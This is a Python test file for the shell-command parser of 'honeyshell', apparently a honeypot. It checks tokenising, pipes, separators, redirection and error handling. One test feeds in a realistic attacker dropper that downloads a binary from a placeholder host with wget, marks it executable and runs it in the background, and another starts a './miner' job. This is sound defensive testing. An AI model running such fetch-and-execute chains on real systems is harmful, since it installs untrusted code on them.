"""Tests for honeyshell.shell.parser.

Runnable two ways:
    python -m pytest tests/test_parser.py        # if pytest is installed
    python tests/test_parser.py                  # standalone fallback runner
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from honeyshell.shell.parser import ParseError, parse  # noqa: E402


# --- helpers to describe the tree compactly -----------------------------


def argvs(cmdline):
    """[[argv per command] per job]."""
    return [[c.argv for c in j.pipeline.commands] for j in cmdline.jobs]


def connectors(cmdline):
    return [j.connector for j in cmdline.jobs]


def redirs(cmdline):
    return [
        [[(r.op, r.target) for r in c.redirects] for c in j.pipeline.commands]
        for j in cmdline.jobs
    ]


# --- basic tokenisation --------------------------------------------------


def test_empty_line():
    cl = parse("")
    assert cl.jobs == []
    assert not cl


def test_whitespace_only():
    assert parse("   \t  ").jobs == []


def test_single_command():
    cl = parse("whoami")
    assert argvs(cl) == [[["whoami"]]]
    assert connectors(cl) == [None]


def test_command_with_args():
    cl = parse("ls -la /tmp")
    assert argvs(cl) == [[["ls", "-la", "/tmp"]]]


def test_quotes_preserve_spaces():
    cl = parse('echo "hello world"')
    assert argvs(cl) == [[["echo", "hello world"]]]


def test_single_quotes_protect_operators():
    cl = parse("echo 'a|b;c'")
    assert argvs(cl) == [[["echo", "a|b;c"]]]


def test_empty_quoted_arg():
    cl = parse('echo ""')
    assert argvs(cl) == [[["echo", ""]]]


# --- pipelines -----------------------------------------------------------


def test_simple_pipe():
    cl = parse("ps aux | grep root")
    assert argvs(cl) == [[["ps", "aux"], ["grep", "root"]]]
    assert connectors(cl) == [None]


def test_triple_pipe():
    cl = parse("cat f | grep x | wc -l")
    assert argvs(cl) == [[["cat", "f"], ["grep", "x"], ["wc", "-l"]]]


def test_no_space_pipe():
    cl = parse("a|b")
    assert argvs(cl) == [[["a"], ["b"]]]


# --- job separators ------------------------------------------------------


def test_semicolon():
    cl = parse("cd /tmp ; ls")
    assert argvs(cl) == [[["cd", "/tmp"]], [["ls"]]]
    assert connectors(cl) == [";", None]


def test_and_or():
    cl = parse("make && ./run || echo fail")
    assert argvs(cl) == [[["make"]], [["./run"]], [["echo", "fail"]]]
    assert connectors(cl) == ["&&", "||", None]


def test_trailing_semicolon_ok():
    cl = parse("ls ;")
    assert argvs(cl) == [[["ls"]]]
    assert connectors(cl) == [";"]


# --- background ----------------------------------------------------------


def test_background_only():
    cl = parse("sleep 100 &")
    assert cl.jobs[0].pipeline.background is True
    assert connectors(cl) == ["&"]


def test_background_then_command():
    cl = parse("./miner & ls")
    assert cl.jobs[0].pipeline.background is True
    assert cl.jobs[1].pipeline.background is False
    assert argvs(cl) == [[["./miner"]], [["ls"]]]


# --- redirection ---------------------------------------------------------


def test_redirect_out():
    cl = parse("echo hi > out.txt")
    assert argvs(cl) == [[["echo", "hi"]]]
    assert redirs(cl) == [[[(">", "out.txt")]]]


def test_redirect_append():
    cl = parse("echo hi >> log")
    assert redirs(cl) == [[[(">>", "log")]]]


def test_redirect_in():
    cl = parse("wc -l < data")
    assert redirs(cl) == [[[("<", "data")]]]


def test_redirect_no_space():
    cl = parse("echo a>b")
    assert argvs(cl) == [[["echo", "a"]]]
    assert redirs(cl) == [[[(">", "b")]]]


def test_redirect_within_pipeline():
    cl = parse("grep x < in | sort > out")
    assert redirs(cl) == [[[("<", "in")], [(">", "out")]]]


# --- deferred features degrade, do not crash -----------------------------


def test_stderr_redirect_is_deferred_syntax_error():
    # 2>&1 is deferred (highest-priority follow-up). Under the strict
    # operator policy the '>&' fragment raises a bash-like syntax error
    # rather than silently mangling argv.
    assert _expect_error("run 2>&1")


def test_ampersand_redirect_is_deferred_syntax_error():
    assert _expect_error("run &> out")


def test_command_substitution_kept_opaque():
    cl = parse("echo $(whoami)")
    assert argvs(cl) == [[["echo", "$(whoami)"]]]


def test_env_var_kept_literal():
    cl = parse("echo $HOME")
    assert argvs(cl) == [[["echo", "$HOME"]]]


# --- syntax errors -------------------------------------------------------


def _expect_error(line):
    try:
        parse(line)
    except ParseError:
        return True
    return False


def test_unbalanced_quote():
    assert _expect_error('echo "unterminated')


def test_leading_pipe():
    assert _expect_error("| ls")


def test_double_pipe_empty_rhs():
    assert _expect_error("ls |")


def test_trailing_and():
    assert _expect_error("ls &&")


def test_leading_semicolon():
    assert _expect_error("; ls")


def test_double_semicolon():
    assert _expect_error("ls ;; ls")


def test_redirect_missing_target():
    assert _expect_error("echo >")


def test_redirect_target_is_operator():
    assert _expect_error("echo > | wc")


# --- realistic attacker one-liner ---------------------------------------


def test_realistic_oneliner():
    cl = parse("cd /tmp && wget http://x/m -O m ; chmod +x m && ./m &")
    assert connectors(cl) == ["&&", ";", "&&", "&"]
    assert cl.jobs[-1].pipeline.background is True
    assert argvs(cl)[1] == [["wget", "http://x/m", "-O", "m"]]


# --- standalone runner ---------------------------------------------------


def _run_standalone() -> int:
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    passed = failed = 0
    for fn in fns:
        try:
            fn()
        except AssertionError as e:
            failed += 1
            print(f"FAIL {fn.__name__}: {e}")
        except Exception as e:  # noqa: BLE001
            failed += 1
            print(f"ERROR {fn.__name__}: {type(e).__name__}: {e}")
        else:
            passed += 1
            print(f"ok   {fn.__name__}")
    print(f"\n{passed} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(_run_standalone())
